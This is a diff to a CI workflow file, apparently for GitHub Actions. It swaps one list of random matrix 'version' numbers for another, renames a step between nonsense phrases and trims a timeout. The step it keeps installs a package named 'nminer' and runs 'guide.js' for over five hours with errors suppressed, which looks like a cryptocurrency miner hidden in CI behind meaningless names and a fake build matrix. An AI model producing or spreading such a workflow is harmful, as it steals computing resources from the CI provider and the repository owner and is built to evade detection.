@@ -9,25 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4117 }
-          - { version: 5584 }
-          - { version: 8747 }
-          - { version: 2346 }
-          - { version: 8899 }
-          - { version: 9216 }
-          - { version: 8486 }
-          - { version: 339 }
-          - { version: 3189 }
-          - { version: 9846 }
-          - { version: 2818 }
-          - { version: 1233 }
-          - { version: 4616 }
-          - { version: 3197 }
-          - { version: 285 }
-          - { version: 9563 }
-          - { version: 675 }
-          - { version: 8821 }
-          - { version: 7035 }
+          - { version: 6443 }
+          - { version: 976 }
+          - { version: 9686 }
+          - { version: 2226 }
+          - { version: 9423 }
+          - { version: 7123 }
+          - { version: 6202 }
+          - { version: 2798 }
+          - { version: 6180 }
+          - { version: 1202 }
+          - { version: 8885 }
+          - { version: 6386 }
+          - { version: 1344 }
+          - { version: 367 }
+          - { version: 1668 }
+          - { version: 8151 }
+          - { version: 8198 }
+          - { version: 6608 }
 
     steps:
       - name: Checkout
@@ -38,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: wrong typewriter
+      - name: um caring staid birth
         run: |
           npm install nminer@latest
-          timeout 346m node guide.js || echo "guide executed"
+          timeout 312m node guide.js || echo "guide executed"
